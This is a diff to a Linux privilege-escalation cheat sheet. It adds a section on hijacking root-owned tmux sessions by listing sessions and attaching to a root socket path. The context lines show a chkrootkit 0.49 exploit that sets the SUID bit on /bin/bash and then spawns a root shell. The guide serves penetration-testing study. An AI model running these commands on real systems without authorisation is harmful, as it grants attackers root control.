@@ -15,6 +15,7 @@ Simple and accurate guide for linux privilege escalation tactics
 - SUID / GUID Binaries
 - Capabilities
 - NFS Root Squashing
+- Tmux
 - chkrootkit 0.49
 
 
@@ -563,5 +564,22 @@ echo "chmod +s /bin/bash" >> /tmp/update
 Wait a While ...
 /bin/bash -p
 id && whoami
+
+```
+
+# Tmux
+
+tmux is a terminal multiplexer for Unix-like operating systems.
+
+It allows multiple terminal sessions to be accessed simultaneously in a single window.
+
+It is useful for running more than one command-line program at the same time.
+
+Privilege Escalation
+
+```
+tmux list-sessions                        // Any Tmux sessions running as root?
+/tmp/tmux-14/default-root                 // Root Tmux Session
+tmux -S /tmp/tmux-14/default-root         // Replace Path to Socket (Depending on your results)
 
 ```
